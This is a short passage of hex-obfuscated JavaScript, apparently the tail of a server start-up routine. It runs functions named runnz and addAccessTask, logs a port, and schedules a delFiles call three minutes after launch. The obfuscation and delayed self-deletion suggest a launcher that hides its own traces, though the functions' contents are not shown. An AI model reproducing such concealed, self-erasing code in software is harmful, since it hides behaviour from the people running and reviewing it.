_0x1f3def={_0x43c585:0x126,_0x1ac8fc:0x102},_0x2d60e0=_0x4b2f90;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2d60e0(_0x1f3def._0x43c585)](_0x2d60e0(_0x1f3def._0x1ac8fc)+PORT);});
